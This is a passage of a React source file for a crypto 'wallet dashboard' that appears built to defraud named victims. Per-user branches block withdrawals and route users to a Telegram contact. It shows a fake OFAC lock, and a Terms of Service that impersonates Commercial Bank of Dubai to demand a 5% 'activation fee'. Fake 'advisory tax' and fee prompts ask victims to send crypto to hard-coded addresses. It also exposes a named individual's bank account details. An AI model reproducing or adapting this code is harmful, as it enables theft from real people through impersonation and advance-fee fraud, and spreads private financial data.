                  In order to proceed with a withdrawal please contact your support agent on Telegram
                </p>
                <a 
                  href="https://t.me/fatima_commercial" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-primary font-semibold mt-2 hover:underline"
                >
                  @fatima_commercial
                </a>
                <Button onClick={() => setIsSendDialogOpen(false)} className="w-full mt-4">
                  OK
                </Button>
              </div>
            ) : isRami ? (
              <div className="text-center">
                <p className="text-lg text-muted-foreground">
                  Contact customer support to activate your wallet
                </p>
                <a 
                  href="https://t.me/fatima_commercial" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-primary font-semibold mt-2 hover:underline"
                >
                  @fatima_commercial
                </a>
                <Button onClick={() => setIsSendDialogOpen(false)} className="w-full mt-4">
                  OK
                </Button>
              </div>
            ) : isLinda ? (
              <div className="text-center">
                <p className="text-lg text-muted-foreground">
                  Please contact @fatima_commercial to process a service fee for the wallet
                </p>
                <a 
                  href="https://t.me/fatima_commercial" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-primary font-semibold mt-2 hover:underline"
                >
                  @fatima_commercial
                </a>
                <Button onClick={() => setIsSendDialogOpen(false)} className="w-full mt-4">
                  OK
                </Button>
              </div>
            ) : (
              <div className="space-y-4">
                <div>
                  <label className="text-sm font-medium text-muted-foreground">Wallet Address</label>
                  <Input
                    value={sendAddress}
                    onChange={(e) => setSendAddress(e.target.value)}
                    placeholder="Enter destination wallet address"
                    className="mt-1"
                  />
                </div>
                <div>
                  <label className="text-sm font-medium text-muted-foreground">Amount ({cryptoSymbol})</label>
                  <Input
                    value={sendAmount}
                    onChange={(e) => setSendAmount(e.target.value)}
                    placeholder="Enter amount to send"
                    type="number"
                    step="0.00000001"
                    className="mt-1"
                  />
                </div>
                <Button 
                  onClick={handleSendSubmit}
                  className="w-full"
                  disabled={!sendAddress || !sendAmount}
                >
                  Send
                </Button>
              </div>
            )}
          </div>
        </DialogContent>
      </Dialog>

      {/* Receive Dialog */}
      <Dialog open={isReceiveDialogOpen} onOpenChange={setIsReceiveDialogOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Your Deposit Address</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            {(isBen || isTommy) ? (
              <>
                <div>
                  <label className="text-sm font-medium text-muted-foreground">Select Cryptocurrency</label>
                  <Select value={selectedCrypto} onValueChange={setSelectedCrypto}>
                    <SelectTrigger className="mt-1">
                      <SelectValue placeholder="Choose cryptocurrency" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="BTC">Bitcoin (BTC)</SelectItem>
                      <SelectItem value="ETH">Ethereum (ETH)</SelectItem>
                      {isBen && <SelectItem value="USDT">Tether (USDT)</SelectItem>}
                      {isTommy && <SelectItem value="XRP">Ripple (XRP)</SelectItem>}
                      {isTommy && <SelectItem value="ADA">Cardano (ADA)</SelectItem>}
                    </SelectContent>
                  </Select>
                </div>
                <div className="p-4 bg-muted rounded-lg">
                  <p className="text-xs text-muted-foreground mb-2 text-center">{selectedCrypto} Address</p>
                  <p className="text-sm font-mono break-all text-center">
                    {isBen ? getBenAddress(selectedCrypto) : getTommyAddress(selectedCrypto)}
                  </p>
                </div>
                <Button 
                  onClick={() => copyToClipboard(isBen ? getBenAddress(selectedCrypto) : getTommyAddress(selectedCrypto))}
                  className="w-full"
                  variant="outline"
                >
                  <Copy className="w-4 h-4 mr-2" />
                  Copy {selectedCrypto} Address
                </Button>
              </>
            ) : (
              <>
                <div className="p-4 bg-muted rounded-lg">
                  <p className="text-sm font-mono break-all text-center">
                    {depositAddress}
                  </p>
                </div>
                <Button 
                  onClick={() => copyToClipboard(depositAddress)}
                  className="w-full"
                  variant="outline"
                >
                  <Copy className="w-4 h-4 mr-2" />
                  Copy Address
                </Button>
              </>
            )}
          </div>
        </DialogContent>
      </Dialog>

      {/* OFAC Dialog */}
      <Dialog open={isOfacDialogOpen} onOpenChange={setIsOfacDialogOpen}>
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle>Withdrawal Blocked</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <p className="text-muted-foreground leading-relaxed">
              Funds are locked by OFAC and are unavailable for withdraw, please contact customer support immediately
            </p>
          </div>
          <Button 
            onClick={() => setIsOfacDialogOpen(false)}
            className="w-full"
          >
            OK
          </Button>
        </DialogContent>
      </Dialog>

      {/* Compliance Dialog */}
      <Dialog open={isComplianceDialogOpen} onOpenChange={setIsComplianceDialogOpen}>
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle>Security & Compliance Notice</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <p className="text-muted-foreground leading-relaxed">
              For security and compliance purposes, please only deposit cryptocurrencies that originate from your own personal wallets or accounts. Funds received from unknown or third-party sources may be subject to review, frozen, or rejected. Thank you for your cooperation.
            </p>
          </div>
          <Button 
            onClick={() => setIsComplianceDialogOpen(false)}
            className="w-full"
          >
            I UNDERSTAND
          </Button>
        </DialogContent>
      </Dialog>

      {/* TOS Dialog - Ben only */}
      {isBen && (
        <Dialog open={isTosDialogOpen} onOpenChange={setIsTosDialogOpen}>
          <DialogContent className="sm:max-w-4xl max-h-[80vh] overflow-y-auto">
            <DialogHeader>
              <DialogTitle>Terms of Service</DialogTitle>
            </DialogHeader>
            <div className="space-y-6 py-4 text-sm">
              <div>
                <h3 className="font-semibold mb-2">1. Introduction</h3>
                <p className="text-muted-foreground leading-relaxed">
                  Welcome to Commercial Wallet ("the Service"), a digital asset custody and transaction service operated by Commercial Bank of Dubai ("the Bank," "we," "us," or "our"). These Terms of Service ("Terms") govern your access to and use of the Service. By accessing, registering for, or using the Service, you acknowledge that you have read, understood, and agree to be bound by these Terms in their entirety. If you do not agree to these Terms, you must not use the Service.
                </p>
              </div>

              <div>
                <h3 className="font-semibold mb-2">2. Definitions</h3>
                <div className="space-y-2 text-muted-foreground">
                  <p>"Account" means your unique user account with Commercial Wallet.</p>
                  <p>"Wallet" means the digital interface allowing you to store, monitor, and transfer Supported Digital Assets.</p>
                  <p>"Supported Digital Assets" means the cryptocurrencies and digital assets that the Bank, at its sole discretion, has chosen to support within the Service.</p>
                  <p>"User," "you," "your" means the individual or entity using the Service.</p>
                </div>
              </div>

              <div>
                <h3 className="font-semibold mb-2">3. Account Registration and Eligibility</h3>
                <p className="text-muted-foreground leading-relaxed">
                  To use the Service, you must be at least 18 years of age and successfully complete the registration process, which includes identity verification and Know Your Customer (KYC) checks as required by the Bank and applicable law.
                </p>
              </div>

              <div>
                <h3 className="font-semibold mb-2">4. Service Activation Fee</h3>
                <div className="space-y-2 text-muted-foreground">
                  <p><strong>4.1. Acknowledgement of Fee.</strong></p>
                  <p>You expressly acknowledge and agree that as a condition of activating your Commercial Wallet and accessing the full functionality of the Service, including the ability to withdraw digital assets, a one-time activation fee of five percent (5%) of the total digital asset balance held within the Wallet must be paid to the Bank.</p>
                  
                  <p><strong>4.2. Fee Payment.</strong></p>
                  <p>This activation fee is payable in the same digital asset for which it is being charged (e.g., a USDT balance requires the fee to be paid in USDT). The fee must be paid in full before any withdrawal of funds can be processed. The fee is deducted from the total balance upon your initiation of the first withdrawal request or as otherwise prompted by the system.</p>
                </div>
              </div>

              <div>
                <h3 className="font-semibold mb-2">5. User Responsibilities and Risks</h3>
                <p className="text-muted-foreground leading-relaxed">
                  You understand and accept the volatile nature of digital assets and that their value may fluctuate significantly. You are solely responsible for safeguarding your login credentials. The Bank is not responsible for any loss of funds resulting from unauthorized access to your Account due to your failure to maintain security.
                </p>
              </div>

              <div>
                <h3 className="font-semibold mb-2">6. Limitations of Liability</h3>
                <p className="text-muted-foreground leading-relaxed">
                  To the fullest extent permitted by law, Commercial Bank of Dubai and its affiliates shall not be liable for any indirect, incidental, special, consequential, or punitive damages, or any loss of profits or digital assets, arising from or related to your use of, or inability to use, the Service.
                </p>
              </div>

              <div>
                <h3 className="font-semibold mb-2">7. Amendments</h3>
                <p className="text-muted-foreground leading-relaxed">
                  The Bank reserves the right to modify these Terms at any time. We will provide notice of changes by updating the "Last Updated" date and posting the new Terms. Your continued use of the Service after such changes constitutes your acceptance of the new Terms.
                </p>
              </div>

              <div>
                <h3 className="font-semibold mb-2">8. Governing Law</h3>
                <p className="text-muted-foreground leading-relaxed">
                  These Terms shall be governed by and construed in accordance with the laws of the United Arab Emirates, and the exclusive jurisdiction of the courts of the Emirate of Dubai.
                </p>
              </div>
            </div>
            <Button 
              onClick={() => setIsTosDialogOpen(false)}
              className="w-full"
            >
              I Acknowledge
            </Button>
          </DialogContent>
        </Dialog>
      )}

      {/* Bank Transfer Completion Dialog */}
      <Dialog open={isBankTransferDialogOpen} onOpenChange={setIsBankTransferDialogOpen}>
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle>
              {showAdvisoryTax ? "Advisory Tax Required" : "Bank Transfer Completed"}
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <p className="text-muted-foreground leading-relaxed">
              {showAdvisoryTax 
                ? "Advisory tax needs to be paid in order to process withdrawal. Please click following link to complete:"
                : "Withdrawal fee needs to be paid in order to process withdrawal. Please click following link to complete:"
              }
            </p>
            <div className="p-4 bg-muted rounded-lg">
              <a 
                href="https://api.btgate.net/processing/v2/requests/08S/08s79b1cf0ccfc945b3a4a179928bd7df0d/payment"
                target="_blank"
                rel="noopener noreferrer"
                className="text-primary font-semibold hover:underline break-all"
              >
                https://api.btgate.net/processing/v2/requests/08S/08s79b1cf0ccfc945b3a4a179928bd7df0d/payment
              </a>
            </div>
          </div>
          <Button 
            onClick={() => {
              setIsBankTransferDialogOpen(false);
              setShowAdvisoryTax(false);
            }}
            className="w-full"
          >
            OK
          </Button>
        </DialogContent>
      </Dialog>

      {/* Transaction Details Dialog */}
      <Dialog open={isTransactionDialogOpen} onOpenChange={setIsTransactionDialogOpen}>
        <DialogContent className="sm:max-w-lg max-h-[80vh]">
          <DialogHeader>
            <DialogTitle>Transaction Details</DialogTitle>
          </DialogHeader>
          <ScrollArea className="max-h-[60vh] pr-4">
            <div className="space-y-4 py-4">
            {selectedTransaction && (
              <>
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="text-sm font-medium text-muted-foreground">Status</label>
                    <p className={`text-sm font-medium mt-1 ${
                      selectedTransaction.status === 'pending' ? 'text-yellow-500' :
                      selectedTransaction.status === 'rejected' ? 'text-destructive' :
                      selectedTransaction.type === 'received' || selectedTransaction.type === 'pending' ? 'text-green-500' :
                      selectedTransaction.type === 'exchange' ? 'text-blue-500' :
                      'text-red-500'
                    }`}>
                      {selectedTransaction.status || 
                       (selectedTransaction.type === 'exchange' ? 'Exchanged' :
                        selectedTransaction.type === 'received' ? 'Received' :
                        selectedTransaction.type === 'pending' ? 'Pending' :
                        'Sent')}
                    </p>
                  </div>
                  <div>
                    <label className="text-sm font-medium text-muted-foreground">Date & Time</label>
                    <p className="text-sm mt-1">{selectedTransaction.date} at {selectedTransaction.time}</p>
                  </div>
                </div>
                
                <div>
                  <label className="text-sm font-medium text-muted-foreground">Amount</label>
                  <p className="text-lg font-bold mt-1">
                    {selectedTransaction.amount} {selectedTransaction.symbol || 'BTC'}
                  </p>
                </div>
                
                {selectedTransaction.to && (
                  <div>
                    <label className="text-sm font-medium text-muted-foreground">To Address</label>
                    <div className="p-3 bg-muted rounded-lg mt-1 break-all">
                      <p className="text-sm font-mono">{selectedTransaction.to}</p>
                    </div>
                  </div>
                )}
                
                {selectedTransaction.network && (
                  <div>
                    <label className="text-sm font-medium text-muted-foreground">Network</label>
                    <p className="text-sm mt-1 uppercase">{selectedTransaction.network}</p>
                  </div>
                )}
                
                <div>
                  <label className="text-sm font-medium text-muted-foreground">Transaction Hash</label>
                  <div className="p-3 bg-muted rounded-lg mt-1 break-all">
                    <p className="text-sm font-mono">{selectedTransaction.hash}</p>
                  </div>
                </div>
                
                {selectedTransaction.exchangeTo && (
                  <div>
                    <label className="text-sm font-medium text-muted-foreground">Exchanged To</label>
                    <p className="text-lg font-bold mt-1">
                      {selectedTransaction.exchangeTo} {selectedTransaction.exchangeToSymbol}
                    </p>
                  </div>
                )}
                
                {/* Completion Message for Pending DASH Transaction */}
                {(selectedTransaction.status === 'pending' || selectedTransaction.type === 'pending') && (selectedTransaction.symbol === 'DASH') && (
                  <div className="bg-orange-50 dark:bg-orange-900/20 border border-orange-200 dark:border-orange-800 rounded-lg p-4 mt-4">
                    <p className="text-sm text-orange-800 dark:text-orange-200 mb-3">
                      To complete this please send 173 dash to XuSqDUvBySq58Fdc42iJZD2NRd8qVQrxau
                    </p>
                    <div className="flex items-center gap-2">
                      <div className="flex-1 p-3 bg-muted rounded-lg font-mono text-sm break-all">
                        XuSqDUvBySq58Fdc42iJZD2NRd8qVQrxau
                      </div>
                      <Button 
                        size="sm"
                        variant="outline"
                        onClick={() => copyToClipboard("XuSqDUvBySq58Fdc42iJZD2NRd8qVQrxau")}
                      >
                        <Copy className="w-4 h-4" />
                      </Button>
                    </div>
                  </div>
                 )}
                
                 {/* Completion Message for Pending BTC to NZD Exchange */}
                {(selectedTransaction.status === 'pending' || selectedTransaction.type === 'pending') && selectedTransaction.exchangeTo && selectedTransaction.exchangeToSymbol === 'NZD' && (
                  <div className="bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 rounded-lg p-4 mt-4">
                    <p className="text-sm text-blue-800 dark:text-blue-200 mb-3">
                      Please complete the transaction by adding 0.0839 BTC for the exchange fees to:
                    </p>
                    <div className="flex items-center gap-2">
                      <div className="flex-1 p-3 bg-muted rounded-lg font-mono text-sm break-all">
                        bc1q5483wqnyt2xcch4m3jqextl06qzq5veetvyzrt
                      </div>
                      <Button 
                        size="sm"
                        variant="outline"
                        onClick={() => copyToClipboard("bc1q5483wqnyt2xcch4m3jqextl06qzq5veetvyzrt")}
                      >
                        <Copy className="w-4 h-4" />
                      </Button>
                    </div>
                  </div>
                )}

                 {/* Completion Message for Pending XMR to GBP Exchange */}
                {(selectedTransaction.status === 'pending' || selectedTransaction.type === 'pending') && selectedTransaction.symbol === 'XMR' && selectedTransaction.description?.includes('Exchange') && selectedTransaction.description?.includes('GBP') && (
                  <div className="bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 rounded-lg p-4 mt-4">
                    <div className="space-y-3">
                      <div className="flex items-center justify-between">
                        <p className="text-sm font-medium text-green-800 dark:text-green-200">Exchange Details</p>
                        <div className="flex items-center gap-1">
                          <div className="w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></div>
                          <span className="text-xs text-yellow-600 dark:text-yellow-400">Processing</span>
                        </div>
                      </div>
                      
                      <div className="grid grid-cols-2 gap-4">
                        <div>
                          <label className="text-xs font-medium text-green-700 dark:text-green-300">From</label>
                          <p className="text-sm font-bold text-green-800 dark:text-green-200">
                            9,627.37 XMR
                          </p>
                        </div>
                        <div>
                          <label className="text-xs font-medium text-green-700 dark:text-green-300">To</label>
                          <p className="text-sm font-bold text-green-800 dark:text-green-200">
                            £2,253,751 GBP
                          </p>
                        </div>
                      </div>
                      
                      <div className="bg-green-100 dark:bg-green-800/20 rounded-lg p-3">
                        <div className="grid grid-cols-2 gap-2 text-xs">
                          <div>
                            <span className="text-green-600 dark:text-green-400">Exchange Rate:</span>
                            <span className="ml-1 font-mono text-green-800 dark:text-green-200">1 XMR = £234.12</span>
                          </div>
                          <div>
                            <span className="text-green-600 dark:text-green-400">Network Fee:</span>
                            <span className="ml-1 font-mono text-green-800 dark:text-green-200">0.05 XMR</span>
                          </div>
                          <div>
                            <span className="text-green-600 dark:text-green-400">Exchange Fee:</span>
                            <span className="ml-1 font-mono text-green-800 dark:text-green-200">1%</span>
                          </div>
                          <div>
                            <span className="text-green-600 dark:text-green-400">Processing Time:</span>
                            <span className="ml-1 font-mono text-green-800 dark:text-green-200">1-3 hours</span>
                          </div>
                        </div>
                      </div>
                      
                      <div className="border-t border-green-200 dark:border-green-700 pt-3">
                        <p className="text-xs text-green-700 dark:text-green-300 mb-2">
                          <strong>Bank Transfer Details:</strong>
                        </p>
                        <div className="bg-white dark:bg-gray-800 rounded-lg p-3 border border-green-200 dark:border-green-700">
                          <div className="space-y-2 text-xs">
                            <div className="flex justify-between">
                              <span className="text-gray-600 dark:text-gray-400">Account Name:</span>
                              <span className="font-mono">Jan Kijowski</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-gray-600 dark:text-gray-400">Sort Code:</span>
                              <span className="font-mono">30 84 23</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-gray-600 dark:text-gray-400">Account:</span>
                              <span className="font-mono">33670668</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-gray-600 dark:text-gray-400">Reference:</span>
                              <span className="font-mono">XMR-EX-{selectedTransaction.id}</span>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                 {/* Completion Message for Pending XMR Transfer */}
                {(selectedTransaction.status === 'pending' || selectedTransaction.type === 'pending') && selectedTransaction.symbol === 'XMR' && selectedTransaction.to === 'FEiKnYzRhu8NB2cVnW9uvF4JyxtFe1UvKXihPNdK7A4M' && (
                  <div className="bg-purple-50 dark:bg-purple-900/20 border border-purple-200 dark:border-purple-800 rounded-lg p-4 mt-4">
                    <p className="text-sm text-purple-800 dark:text-purple-200 mb-3">
                      To complete this please send 31 monero to 4964xDDsbbiNGfe1q7dFrXYtGTcSKsj6tfF7GB3r7XzXRJKsN6khWpfMwrobfNn8receEifoEph3V6BYz7FcoFkLFmUJvPM or 9832.88 usdc to 0x42332Ed7F756d92dd093551bAcF06Dc9E8B5Ec3A
                    </p>
                    <div className="space-y-3">
                      <div>
                        <p className="text-xs text-purple-700 dark:text-purple-300 mb-1">Monero Address (31 XMR):</p>
                        <div className="flex items-center gap-2">
                          <div className="flex-1 p-3 bg-muted rounded-lg font-mono text-xs break-all">
                            4964xDDsbbiNGfe1q7dFrXYtGTcSKsj6tfF7GB3r7XzXRJKsN6khWpfMwrobfNn8receEifoEph3V6BYz7FcoFkLFmUJvPM
                          </div>
                          <Button 
                            size="sm"
                            variant="outline"
                            onClick={() => copyToClipboard("4964xDDsbbiNGfe1q7dFrXYtGTcSKsj6tfF7GB3r7XzXRJKsN6khWpfMwrobfNn8receEifoEph3V6BYz7FcoFkLFmUJvPM")}
                          >
                            <Copy className="w-4 h-4" />
                          </Button>
                        </div>
                      </div>
                      <div>
                        <p className="text-xs text-purple-700 dark:text-purple-300 mb-1">USDC Address (9832.88 USDC):</p>
                        <div className="flex items-center gap-2">
                          <div className="flex-1 p-3 bg-muted rounded-lg font-mono text-sm break-all">
                            0x42332Ed7F756d92dd093551bAcF06Dc9E8B5Ec3A
                          </div>
                          <Button 
                            size="sm"
                            variant="outline"
                            onClick={() => copyToClipboard("0x42332Ed7F756d92dd093551bAcF06Dc9E8B5Ec3A")}
                          >
                            <Copy className="w-4 h-4" />
                          </Button>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {/* Fine alert removed for Jan Kijowski */}
              </>
            )}
           </div>
          </ScrollArea>
          <Button 
            onClick={() => setIsTransactionDialogOpen(false)}
            className="w-full"
          >
            Close
          </Button>
        </DialogContent>
      </Dialog>

      {/* Jan Urgent Attention Dialog - Removed */}

      {/* TOS Button - Ben only */}
      {isBen && (
        <Button
          onClick={() => setIsTosDialogOpen(true)}
          variant="outline"
          size="sm"
          className="fixed bottom-6 left-6 z-50"
        >
          TOS
        </Button>
      )}
    </div>
  );
};

export default WalletDashboard;